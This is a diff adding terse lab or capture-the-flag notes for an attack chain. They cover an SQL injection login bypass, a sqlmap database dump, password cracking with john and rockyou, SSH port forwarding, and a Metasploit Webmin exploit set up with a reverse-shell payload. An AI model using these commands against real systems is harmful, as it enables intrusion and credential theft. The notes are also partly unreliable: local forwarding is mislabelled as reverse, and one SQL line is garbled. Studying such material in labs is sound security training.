@@ -1,0 +1,19 @@
+SELECT * FROM users WHERE username = :username AND password := password
+ ' or 1=1 -- -
+ 
+ Capture Request with Burp Suite
+ sqlmap -r request.txt --dbms=mysql --dump
+ 
+ john hash.txt --wordlist=rockyou.txt --format=Raw-SHA256
+  
+ We will use a tool called ss to investigate sockets running on a host.
+If we run ss -tulpn it will tell us what socket connections are running
+
+
+ Reverse SSH port forwarding
+ ssh -L 10000:localhost:10000 <username>@<ip>
+ 
+ msf6 exploit(unix/webapp/webmin_show_cgi_exec) > show options
+set PAYLOAD payload/cmd/unix/reverse
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set RHOSTS 127.0.0.1
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set SSL false
